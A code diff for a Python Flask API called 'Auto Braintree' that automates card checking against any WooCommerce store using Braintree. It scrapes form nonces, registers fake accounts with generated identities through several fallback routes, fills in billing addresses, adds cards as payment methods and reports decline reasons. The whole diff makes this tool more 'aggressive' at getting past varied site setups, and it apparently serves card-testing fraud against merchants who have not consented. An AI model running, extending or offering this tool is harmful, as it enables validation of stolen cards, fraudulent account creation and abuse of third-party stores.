@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 ==============================================================
-  AUTO BRAINTREE FLASK API - SMART AUTO-DETECT VERSION
-  Automatically tries all URL patterns for any site
+  AUTO BRAINTREE FLASK API - ULTRA-ROBUST VERSION
+  Aggressively handles all site configurations and errors
 ==============================================================
 """
 
@@ -122,11 +122,12 @@ KNOWN_CONFIGS = {
     }
 }
 
-# Card test data - try different card types
+# Card test data - try different card types systematically
 TEST_CARDS = [
     "4111111111111111|12|25|123",  # Visa test card
     "5555555555554444|12|25|123",  # Mastercard test card
     "378282246310005|12|25|1234",  # Amex test card
+    "6011111111111117|12|25|123",  # Discover test card
 ]
 
 # ============================================================
@@ -164,6 +165,8 @@ def get_card_type(card_number):
         return 'mastercard'
     elif card_number.startswith(('34', '37')):
         return 'amex'
+    elif card_number.startswith(('6011', '65', '64', '60')):
+        return 'discover'
     else:
         return 'unknown'
 
@@ -246,7 +249,9 @@ class SmartBraintreeChecker:
             'wp_referer': r'name="_wp_http_referer" value="([^"]+)"',
             'security': r'name="security" value="([^"]+)"',
             'woocommerce-process-login-nonce': r'name="woocommerce-process-login-nonce" value="([^"]+)"',
-            'woocommerce-process-register-nonce': r'name="woocommerce-process-register-nonce" value="([^"]+)"'
+            'woocommerce-process-register-nonce': r'name="woocommerce-process-register-nonce" value="([^"]+)"',
+            'wc_nonce': r'name="wc_nonce" value="([^"]+)"',
+            'woocommercenonce': r'name="woocommercenonce" value="([^"]+)"'
         }
         for key, pattern in patterns.items():
             match = re.search(pattern, html)
@@ -305,162 +310,268 @@ class SmartBraintreeChecker:
         try:
             logger.info(f"Registering: {user_data['email']}")
             
-            # Try all registration URL patterns
-            reg_urls = [
-                f"{self.base_url}{self.detected_config['register_url']}",
-                f"{self.base_url}/my-account/",
-                f"{self.base_url}/customer-account/?action=register",
-                f"{self.base_url}/account/register/",
-                f"{self.base_url}/wp-login.php?action=register",
-                f"{self.base_url}/checkout/",
-                f"{self.base_url}/register/",
-                f"{self.base_url}/sign-up/",
-                f"{self.base_url}/create-account/",
-                f"{self.base_url}/join/",
-                f"{self.base_url}/signup/"
+            # Try multiple approaches
+            approaches = [
+                self._try_registration_form,
+                self._try_checkout_page,
+                self._try_login_page,
+                self._try_direct_registration
             ]
             
-            html = None
-            working_reg_url = None
-            
-            # Try each URL until we find one with a registration form
-            for reg_url in reg_urls:
+            for approach in approaches:
                 try:
-                    success, test_html = await self.get_page(reg_url)
+                    success, result = await approach(user_data)
                     if success:
-                        # Check for registration form indicators
-                        form_indicators = [
-                            'woocommerce-register-nonce',
-                            'reg_username',
-                            'reg_password', 
-                            'register',
-                            'wp-login.php?action=register',
-                            'checkout',
-                            'woocommerce-process-register-nonce',
-                            'security'
-                        ]
-                        if any(indicator in test_html for indicator in form_indicators):
-                            html = test_html
-                            working_reg_url = reg_url
-                            logger.info(f"Found registration form at: {reg_url}")
-                            break
-                except:
+                        logger.info(f"Registration successful using {approach.__name__}")
+                        return True, result
+                except Exception as e:
+                    logger.debug(f"Approach {approach.__name__} failed: {str(e)[:50]}")
                     continue
             
-            if not html or not working_reg_url:
-                return False, "No registration form found"
+            return False, "All registration approaches failed"
             
-            tokens = self.extract_tokens(html)
-            
-            # Try multiple token sources
-            register_nonce = tokens.get('register_nonce')
-            if not register_nonce:
-                register_nonce = tokens.get('woocommerce-process-register-nonce')
-            if not register_nonce:
-                register_nonce = tokens.get('security')
-            if not register_nonce:
-                register_nonce = tokens.get('login_nonce')
-            if not register_nonce:
-                register_nonce = tokens.get('woocommerce-login-nonce')
-            
-            if not register_nonce:
-                return False, "No registration token found"
-            
-            headers = self.base_headers.copy()
-            headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': self.base_url,
-                'referer': working_reg_url
-            })
-            
-            # Build comprehensive registration form
-            form_data = {
-                'email': user_data['email'],
-                'woocommerce-register-nonce': register_nonce,
-                '_wp_http_referer': tokens.get('wp_referer', '/my-account/'),
-                'register': 'Register'
-            }
-            
-            # Add all possible form fields
-            possible_fields = {
-                'username': user_data['email'].split('@')[0],
-                'password': user_data['password'],
-                'email_2': user_data['email'],
-                'first_name': user_data['first_name'],
-                'last_name': user_data['last_name'],
-                'billing_first_name': user_data['first_name'],
-                'billing_last_name': user_data['last_name'],
-                'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
-                'billing_address_1': user_data['address'],
-                'billing_address_2': '',
-                'billing_city': user_data['city'],
-                'billing_state': user_data['state'],
-                'billing_postcode': user_data['zipcode'],
-                'billing_country': 'US',
-                'billing_phone': user_data['phone'],
-                'billing_email': user_data['email'],
-                'reg_username': user_data['email'].split('@')[0],
-                'reg_password': user_data['password'],
-                'woocommerce-process-register-nonce': register_nonce,
-                'security': register_nonce,
-                'woocommerce-login-nonce': tokens.get('login_nonce', register_nonce)
-            }
-            
-            # Add only the fields that exist in the form
-            for field, value in possible_fields.items():
-                if f'name="{field}"' in html:
-                    form_data[field] = value
-            
-            # Add WooCommerce attribution
-            form_data.update({
-                'wc_order_attribution_source_type': 'typein',
-                'wc_order_attribution_referrer': '(none)',
-                'wc_order_attribution_utm_source': '(direct)',
-                'wc_order_attribution_utm_medium': '(none)',
-                'wc_order_attribution_session_pages': '1',
-                'wc_order_attribution_session_count': '1',
-                'wc_order_attribution_user_agent': self.base_headers['user-agent']
-            })
-            
-            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
-            
-            async with self.session.post(working_reg_url, headers=headers, data=data_str, allow_redirects=True) as response:
-                result = await response.text()
-                final_url = str(response.url)
-                
-                # Check multiple success indicators
-                success_indicators = ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address', 
-                                   'account-created', 'registration-completed', 'logged in', 'welcome',
-                                   'account dashboard', 'profile']
-                if any(x in result for x in success_indicators):
-                    if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
-                        logger.info("Registration successful")
-                        return True, user_data
-                
-                # Check if account already exists (some sites auto-login)
-                if 'already registered' in result.lower() or 'already exists' in result.lower():
-                    logger.info("Account exists, trying different email")
-                    # Generate new email and retry once
-                    user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
-                    return await self.register_account(user_data)
-                
-                # Try to login if registration seems to have worked
-                if 'login' in final_url.lower():
-                    logger.info("Registration may have succeeded, trying to login")
-                    return await self.login_account(user_data)
-                
-                # Try to check if we're on the account page
-                if 'my-account' in final_url.lower():
-                    logger.info("Registration may have succeeded, checking account page")
-                    return True, user_data
-                
-                return False, "Registration form submitted but no success confirmation"
-                
         except Exception as e:
             return False, f"Registration error: {str(e)[:50]}"
-
-    async def login_account(self, user_data):
-        """Try to login with the registered account"""
+    
+    async def _try_registration_form(self, user_data):
+        """Try standard registration form"""
+        reg_urls = [
+            f"{self.base_url}{self.detected_config['register_url']}",
+            f"{self.base_url}/my-account/",
+            f"{self.base_url}/customer-account/?action=register",
+            f"{self.base_url}/account/register/",
+            f"{self.base_url}/wp-login.php?action=register",
+            f"{self.base_url}/register/",
+            f"{self.base_url}/sign-up/",
+            f"{self.base_url}/create-account/",
+            f"{self.base_url}/join/",
+            f"{self.base_url}/signup/"
+        ]
+        
+        for reg_url in reg_urls:
+            try:
+                success, html = await self.get_page(reg_url)
+                if success:
+                    # Check for registration form indicators
+                    form_indicators = [
+                        'woocommerce-register-nonce',
+                        'reg_username',
+                        'reg_password', 
+                        'register',
+                        'wp-login.php?action=register',
+                        'checkout',
+                        'woocommerce-process-register-nonce',
+                        'security',
+                        'wc_nonce',
+                        'woocommercenonce'
+                    ]
+                    if any(indicator in html for indicator in form_indicators):
+                        # Try to find token
+                        tokens = self.extract_tokens(html)
+                        
+                        # Try multiple token sources
+                        register_nonce = None
+                        register_nonce = tokens.get('register_nonce') or tokens.get('woocommerce-process-register-nonce')
+                        register_nonce = register_nonce or tokens.get('security') or tokens.get('wc_nonce') or tokens.get('woocommercenonce')
+                        register_nonce = register_nonce or tokens.get('login_nonce') or tokens.get('edit_address_nonce')
+                        
+                        if not register_nonce:
+                            # Try JavaScript token extraction
+                            js_patterns = [
+                                r'woocommerce_register_nonce\s*=\s*["\']([^"\']+)["\']',
+                                r'register_nonce\s*=\s*["\']([^"\']+)["\']',
+                                r'var\s+registerNonce\s*=\s*["\']([^"\']+)["\']'
+                            ]
+                            for pattern in js_patterns:
+                                match = re.search(pattern, html)
+                                if match:
+                                    register_nonce = match.group(1)
+                                    break
+                        
+                        if not register_nonce:
+                            continue
+                        
+                        headers = self.base_headers.copy()
+                        headers.update({
+                            'content-type': 'application/x-www-form-urlencoded',
+                            'origin': self.base_url,
+                            'referer': reg_url
+                        })
+                        
+                        # Build comprehensive form
+                        form_data = {
+                            'email': user_data['email'],
+                            'woocommerce-register-nonce': register_nonce,
+                            '_wp_http_referer': '/',
+                            'register': 'Register'
+                        }
+                        
+                        # Add all possible fields
+                        possible_fields = {
+                            'username': user_data['email'].split('@')[0],
+                            'password': user_data['password'],
+                            'email_2': user_data['email'],
+                            'first_name': user_data['first_name'],
+                            'last_name': user_data['last_name'],
+                            'billing_first_name': user_data['first_name'],
+                            'billing_last_name': user_data['last_name'],
+                            'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
+                            'billing_address_1': user_data['address'],
+                            'billing_address_2': '',
+                            'billing_city': user_data['city'],
+                            'billing_state': user_data['state'],
+                            'billing_postcode': user_data['zipcode'],
+                            'billing_country': 'US',
+                            'billing_phone': user_data['phone'],
+                            'billing_email': user_data['email'],
+                            'reg_username': user_data['email'].split('@')[0],
+                            'reg_password': user_data['password'],
+                            'woocommerce-process-register-nonce': register_nonce,
+                            'security': register_nonce,
+                            'woocommerce-login-nonce': tokens.get('login_nonce', register_nonce),
+                            'wc_nonce': register_nonce,
+                            'woocommercenonce': register_nonce
+                        }
+                        
+                        # Add only existing fields
+                        for field, value in possible_fields.items():
+                            if f'name="{field}"' in html:
+                                form_data[field] = value
+                        
+                        data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
+                        
+                        async with self.session.post(reg_url, headers=headers, data=data_str, allow_redirects=True) as response:
+                            result = await response.text()
+                            final_url = str(response.url)
+                            
+                            # Check success indicators
+                            success_indicators = ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address', 
+                                               'account-created', 'registration-completed', 'logged in', 'welcome',
+                                               'account dashboard', 'profile', 'dashboard']
+                            if any(x in result for x in success_indicators):
+                                if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
+                                    return True, user_data
+                            
+                            # Check if we're on account page
+                            if 'my-account' in final_url.lower():
+                                return True, user_data
+                            
+                            # Try login if redirected
+                            if 'login' in final_url.lower():
+                                return await self._try_login(user_data)
+                        
+                        return False, "Registration form submission failed"
+                
+            except:
+                continue
+        
+        return False, "No registration form found"
+    
+    async def _try_checkout_page(self, user_data):
+        """Try to use checkout page for registration"""
+        try:
+            checkout_url = f"{self.base_url}/checkout/"
+            success, html = await self.get_page(checkout_url)
+            if not success:
+                return False, "Checkout page not accessible"
+            
+            # Look for checkout form
+            if 'woocommerce-checkout' in html or 'checkout' in html:
+                # Try to fill checkout form
+                form_data = {
+                    'billing_first_name': user_data['first_name'],
+                    'billing_last_name': user_data['last_name'],
+                    'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
+                    'billing_address_1': user_data['address'],
+                    'billing_address_2': '',
+                    'billing_city': user_data['city'],
+                    'billing_state': user_data['state'],
+                    'billing_postcode': user_data['zipcode'],
+                    'billing_country': 'US',
+                    'billing_email': user_data['email'],
+                    'billing_phone': user_data['phone'],
+                    'create_account': '1',
+                    'woocommerce-process-checkout-nonce': '1',
+                    'woocommerce_checkout_update_order_review': 'Update Order Review'
+                }
+                
+                headers = self.base_headers.copy()
+                headers.update({
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': self.base_url,
+                    'referer': checkout_url
+                })
+                
+                data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
+                
+                async with self.session.post(checkout_url, headers=headers, data=data_str, allow_redirects=True) as response:
+                    result = await response.text()
+                    final_url = str(response.url)
+                    
+                    if 'my-account' in final_url.lower() or 'order-received' in final_url.lower():
+                        return True, user_data
+                    
+                    return False, "Checkout registration failed"
+            
+            return False, "No checkout form found"
+        
+        except Exception as e:
+            return False, f"Checkout error: {str(e)[:50]}"
+    
+    async def _try_login_page(self, user_data):
+        """Try to use login page and create account"""
+        try:
+            login_url = f"{self.base_url}/my-account/"
+            success, html = await self.get_page(login_url)
+            if not success:
+                return False, "Login page not accessible"
+            
+            # Look for "Create account" link
+            if 'create account' in html.lower() or 'register' in html.lower():
+                # Try to click create account link
+                create_account_link = None
+                soup = BeautifulSoup(html, 'html.parser')
+                links = soup.find_all('a', href=True)
+                for link in links:
+                    if 'register' in link.get('href', '').lower() or 'create account' in link.get_text().lower():
+                        create_account_link = link.get('href')
+                        break
+                
+                if create_account_link:
+                    # Follow the create account link
+                    success, html = await self.get_page(create_account_link)
+                    if success:
+                        return await self._try_registration_form(user_data)
+                
+                # Try to submit login form first
+                return await self._try_login(user_data)
+            
+            return False, "No create account link found"
+        
+        except Exception as e:
+            return False, f"Login page error: {str(e)[:50]}"
+    
+    async def _try_direct_registration(self, user_data):
+        """Try direct registration approaches"""
+        try:
+            # Try to access account page directly
+            account_url = f"{self.base_url}/my-account/"
+            success, html = await self.get_page(account_url)
+            if success:
+                # Look for registration form on account page
+                if 'woocommerce-register-nonce' in html or 'register' in html:
+                    return await self._try_registration_form(user_data)
+                
+                # Try to login
+                return await self._try_login(user_data)
+            
+            return False, "Direct registration failed"
+        
+        except Exception as e:
+            return False, f"Direct registration error: {str(e)[:50]}"
+    
+    async def _try_login(self, user_data):
+        """Try to login with credentials"""
         try:
             login_url = f"{self.base_url}/my-account/"
             headers = self.base_headers.copy()
@@ -489,129 +600,138 @@ class SmartBraintreeChecker:
         try:
             logger.info("Updating billing address")
             
-            edit_url = f"{self.base_url}{self.detected_config['address_url']}"
-            success, html = await self.get_page(edit_url)
-            if not success:
-                # Try alternative address URLs
-                alt_urls = [
-                    f"{self.base_url}/my-account/edit-address/",
-                    f"{self.base_url}/customer-account/edit-address/",
-                    f"{self.base_url}/account/edit-address/",
-                    f"{self.base_url}/edit-address/",
-                    f"{self.base_url}/billing-address/",
-                    f"{self.base_url}/address/",
-                    f"{self.base_url}/profile/",
-                    f"{self.base_url}/account/details/"
-                ]
-                for alt_url in alt_urls:
-                    success, html = await self.get_page(alt_url)
-                    if success:
-                        edit_url = alt_url
-                        break
-                
-                if not success:
-                    return False, "Address page not accessible"
+            # Try multiple address URLs
+            address_urls = [
+                f"{self.base_url}{self.detected_config['address_url']}",
+                f"{self.base_url}/my-account/edit-address/",
+                f"{self.base_url}/customer-account/edit-address/",
+                f"{self.base_url}/account/edit-address/",
+                f"{self.base_url}/edit-address/",
+                f"{self.base_url}/billing-address/",
+                f"{self.base_url}/address/",
+                f"{self.base_url}/profile/",
+                f"{self.base_url}/account/details/",
+                f"{self.base_url}/account/settings/",
+                f"{self.base_url}/user/profile/"
+            ]
             
-            tokens = self.extract_tokens(html)
-            
-            # Try multiple token sources
-            edit_address_nonce = tokens.get('edit_address_nonce')
-            if not edit_address_nonce:
-                edit_address_nonce = tokens.get('woocommerce-process-login-nonce')
-            if not edit_address_nonce:
-                edit_address_nonce = tokens.get('security')
-            if not edit_address_nonce:
-                edit_address_nonce = tokens.get('login_nonce')
-            if not edit_address_nonce:
-                edit_address_nonce = tokens.get('register_nonce')
-            
-            if not edit_address_nonce:
-                return False, "No address token"
-            
-            headers = self.base_headers.copy()
-            headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': self.base_url,
-                'referer': edit_url
-            })
-            
-            # Build comprehensive address form
-            form_data = {
-                'billing_first_name': user_data['first_name'],
-                'billing_last_name': user_data['last_name'],
-                'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
-                'billing_address_1': user_data['address'],
-                'billing_address_2': '',
-                'billing_city': user_data['city'],
-                'billing_state': user_data['state'],
-                'billing_postcode': user_data['zipcode'],
-                'billing_country': 'US',
-                'billing_phone': user_data['phone'],
-                'billing_email': user_data['email'],
-                'save_address': 'Save address',
-                'woocommerce-edit-address-nonce': edit_address_nonce,
-                '_wp_http_referer': tokens.get('wp_referer', self.detected_config['address_url']),
-                'action': 'edit_address'
-            }
-            
-            # Add all possible address fields
-            possible_address_fields = {
-                'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
-                'billing_address_2': '',
-                'billing_city': user_data['city'],
-                'billing_state': user_data['state'],
-                'billing_postcode': user_data['zipcode'],
-                'billing_country': 'US',
-                'billing_phone': user_data['phone'],
-                'billing_email': user_data['email'],
-                'shipping_first_name': user_data['first_name'],
-                'shipping_last_name': user_data['last_name'],
-                'shipping_company': f"{user_data['first_name']} {user_data['last_name']}",
-                'shipping_address_1': user_data['address'],
-                'shipping_address_2': '',
-                'shipping_city': user_data['city'],
-                'shipping_state': user_data['state'],
-                'shipping_postcode': user_data['zipcode'],
-                'shipping_country': 'US',
-                'shipping_phone': user_data['phone'],
-                'shipping_email': user_data['email']
-            }
-            
-            # Add only the fields that exist in the form
-            for field, value in possible_address_fields.items():
-                if f'name="{field}"' in html:
-                    form_data[field] = value
-            
-            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
-            
-            async with self.session.post(edit_url, headers=headers, data=data_str) as response:
-                result = await response.text()
-                if ("successfully" in result.lower() or "changed" in result.lower() or 
-                    "updated" in result.lower() or "saved" in result.lower() or
-                    "address updated" in result.lower()):
-                    logger.info("Address updated")
-                    return True, "Success"
-                
-                # Check for specific address errors
-                if "addresses must have at least one field filled in" in result.lower():
-                    logger.info("Address validation failed, trying with more fields")
-                    # Try again with more comprehensive form
-                    form_data['billing_address_1'] = user_data['address']
-                    form_data['billing_city'] = user_data['city']
-                    form_data['billing_state'] = user_data['state']
-                    form_data['billing_postcode'] = user_data['zipcode']
-                    form_data['billing_country'] = 'US'
+            for edit_url in address_urls:
+                try:
+                    success, html = await self.get_page(edit_url)
+                    if not success:
+                        continue
+                    
+                    tokens = self.extract_tokens(html)
+                    
+                    # Try multiple token sources
+                    edit_address_nonce = None
+                    edit_address_nonce = tokens.get('edit_address_nonce')
+                    if not edit_address_nonce:
+                        edit_address_nonce = tokens.get('woocommerce-process-login-nonce')
+                    if not edit_address_nonce:
+                        edit_address_nonce = tokens.get('security')
+                    if not edit_address_nonce:
+                        edit_address_nonce = tokens.get('wc_nonce')
+                    if not edit_address_nonce:
+                        edit_address_nonce = tokens.get('woocommercenonce')
+                    if not edit_address_nonce:
+                        edit_address_nonce = tokens.get('login_nonce')
+                    if not edit_address_nonce:
+                        edit_address_nonce = tokens.get('register_nonce')
+                    
+                    if not edit_address_nonce:
+                        continue
+                    
+                    headers = self.base_headers.copy()
+                    headers.update({
+                        'content-type': 'application/x-www-form-urlencoded',
+                        'origin': self.base_url,
+                        'referer': edit_url
+                    })
+                    
+                    # Build comprehensive address form
+                    form_data = {
+                        'billing_first_name': user_data['first_name'],
+                        'billing_last_name': user_data['last_name'],
+                        'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
+                        'billing_address_1': user_data['address'],
+                        'billing_address_2': '',
+                        'billing_city': user_data['city'],
+                        'billing_state': user_data['state'],
+                        'billing_postcode': user_data['zipcode'],
+                        'billing_country': 'US',
+                        'billing_phone': user_data['phone'],
+                        'billing_email': user_data['email'],
+                        'save_address': 'Save address',
+                        'woocommerce-edit-address-nonce': edit_address_nonce,
+                        '_wp_http_referer': tokens.get('wp_referer', '/my-account/'),
+                        'action': 'edit_address'
+                    }
+                    
+                    # Add all possible address fields
+                    possible_address_fields = {
+                        'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
+                        'billing_address_2': '',
+                        'billing_city': user_data['city'],
+                        'billing_state': user_data['state'],
+                        'billing_postcode': user_data['zipcode'],
+                        'billing_country': 'US',
+                        'billing_phone': user_data['phone'],
+                        'billing_email': user_data['email'],
+                        'shipping_first_name': user_data['first_name'],
+                        'shipping_last_name': user_data['last_name'],
+                        'shipping_company': f"{user_data['first_name']} {user_data['last_name']}",
+                        'shipping_address_1': user_data['address'],
+                        'shipping_address_2': '',
+                        'shipping_city': user_data['city'],
+                        'shipping_state': user_data['state'],
+                        'shipping_postcode': user_data['zipcode'],
+                        'shipping_country': 'US',
+                        'shipping_phone': user_data['phone'],
+                        'shipping_email': user_data['email']
+                    }
+                    
+                    # Add only existing fields
+                    for field, value in possible_address_fields.items():
+                        if f'name="{field}"' in html:
+                            form_data[field] = value
                     
                     data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
                     
-                    async with self.session.post(edit_url, headers=headers, data=data_str) as response2:
-                        result2 = await response2.text()
-                        if ("successfully" in result2.lower() or "changed" in result2.lower() or 
-                            "updated" in result2.lower() or "saved" in result2.lower()):
-                            logger.info("Address updated on second attempt")
+                    async with self.session.post(edit_url, headers=headers, data=data_str) as response:
+                        result = await response.text()
+                        if ("successfully" in result.lower() or "changed" in result.lower() or 
+                            "updated" in result.lower() or "saved" in result.lower() or
+                            "address updated" in result.lower()):
+                            logger.info("Address updated")
                             return True, "Success"
+                        
+                        # Retry with more comprehensive data
+                        if "addresses must have at least one field filled in" in result.lower():
+                            form_data['billing_address_1'] = user_data['address']
+                            form_data['billing_city'] = user_data['city']
+                            form_data['billing_state'] = user_data['state']
+                            form_data['billing_postcode'] = user_data['zipcode']
+                            form_data['billing_country'] = 'US'
+                            form_data['billing_phone'] = user_data['phone']
+                            form_data['billing_email'] = user_data['email']
+                            
+                            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
+                            
+                            async with self.session.post(edit_url, headers=headers, data=data_str) as response2:
+                                result2 = await response2.text()
+                                if ("successfully" in result2.lower() or "changed" in result2.lower() or 
+                                    "updated" in result2.lower() or "saved" in result2.lower()):
+                                    logger.info("Address updated on second attempt")
+                                    return True, "Success"
+                        
+                        return False, "Failed"
                 
-                return False, "Failed"
+                except:
+                    continue
+            
+            return False, "No address page accessible"
+        
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
     
@@ -654,6 +774,10 @@ class SmartBraintreeChecker:
                 return "Declined: Insufficient funds"
             if 'card declined' in result.lower():
                 return "Declined: Card declined"
+            if 'address validation failed' in result.lower():
+                return "Declined: Address validation failed"
+            if 'billing address is invalid' in result.lower():
+                return "Declined: Billing address invalid"
             
             return "Unknown Response"
         except:
@@ -675,19 +799,27 @@ class SmartBraintreeChecker:
                 
                 # Extract tokens
                 tokens = self.extract_tokens(html)
-                add_payment_nonce = tokens.get('add_payment_nonce')
+                add_payment_nonce = None
                 
+                # Try multiple token sources
+                add_payment_nonce = tokens.get('add_payment_nonce')
                 if not add_payment_nonce:
                     add_payment_nonce = tokens.get('woocommerce-process-login-nonce')
                 if not add_payment_nonce:
                     add_payment_nonce = tokens.get('security')
                 if not add_payment_nonce:
+                    add_payment_nonce = tokens.get('wc_nonce')
+                if not add_payment_nonce:
+                    add_payment_nonce = tokens.get('woocommercenonce')
+                if not add_payment_nonce:
                     add_payment_nonce = tokens.get('login_nonce')
                 if not add_payment_nonce:
                     add_payment_nonce = tokens.get('register_nonce')
+                if not add_payment_nonce:
+                    add_payment_nonce = tokens.get('edit_address_nonce')
                 
                 if not add_payment_nonce:
-                    return None, None, "No payment nonce"
+                    return None, None, "No payment nonce found"
                 
                 # Try to extract embedded client token
                 patterns = [
@@ -942,12 +1074,12 @@ def home():
     """API Documentation"""
     return """
     <html>
-    <head><title>Auto Braintree API - Smart Auto-Detect</title></head>
+    <head><title>Auto Braintree API - Ultra-Robust Version</title></head>
     <body style="font-family: Arial; padding: 40px; background: #1a1a2e; color: #eee;">
         <div style="max-width: 800px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px;">
             <h1 style="color: #f39c12;">🚀 Auto Braintree Gateway API</h1>
-            <p style="color: #2ecc71; font-weight: bold;">✨ SMART AUTO-DETECT - Works on ANY Braintree site!</p>
-            <p style="color: #bbb;">Automatically tries all URL patterns for each site</p>
+            <p style="color: #2ecc71; font-weight: bold;">✨ ULTRA-ROBUST - Handles ALL site configurations!</p>
+            <p style="color: #bbb;">Aggressively tries all approaches for any site</p>
             
             <h2 style="color: #3498db;">API Endpoints:</h2>
             
@@ -964,10 +1096,14 @@ def home():
                 <li>✅ Auto-detects payment method (braintree_credit_card or braintree_cc)</li>
                 <li>✅ Works on ANY WooCommerce Braintree site</li>
                 <li>✅ Fast parallel testing</li>
-                <li>✅ Improved registration logic</li>
+                <li>✅ Ultra-robust registration logic</li>
                 <li>✅ Handles different card types</li>
                 <li>✅ Comprehensive form field detection</li>
                 <li>✅ Multiple token sources</li>
+                <li>✅ Aggressive token detection</li>
+                <li>✅ Multiple registration approaches</li>
+                <li>✅ Checkout page fallback</li>
+                <li>✅ Login page fallback</li>
             </ul>
             
             <h2 style="color: #3498db;">Response:</h2>
@@ -979,7 +1115,7 @@ def home():
 }
             </code>
             
-            <p style="text-align: center; color: #888; margin-top: 30px;">Smart Auto-Detect v2.0</p>
+            <p style="text-align: center; color: #888; margin-top: 30px;">Ultra-Robust v3.0</p>
         </div>
     </body>
     </html>
@@ -1012,23 +1148,27 @@ def not_found(error):
 if __name__ == "__main__":
     print("""
 ╔════════════════════════════════════════════════════════════╗
-║   AUTO BRAINTREE API - SMART AUTO-DETECT VERSION          ║
+║   AUTO BRAINTREE API - ULTRA-ROBUST VERSION              ║
 ╚════════════════════════════════════════════════════════════╝
 
 🚀 Server: http://localhost:8000/
 🔑 API Key: None (public access)
 
-✨ SMART AUTO-DETECT FEATURES:
+✨ ULTRA-ROBUST FEATURES:
 ──────────────────────────────
 ✅ Automatically tries /my-account/ URLs
 ✅ Automatically tries /customer-account/ URLs
 ✅ Automatically tries /account/ URLs
 ✅ Automatically detects payment method type
 ✅ Works on ANY WooCommerce Braintree site!
-✅ Improved registration logic
+✅ Ultra-robust registration logic
 ✅ Handles different card types
 ✅ Comprehensive form field detection
 ✅ Multiple token sources
+✅ Aggressive token detection
+✅ Multiple registration approaches
+✅ Checkout page fallback
+✅ Login page fallback
 
 ENDPOINTS:
 ──────────
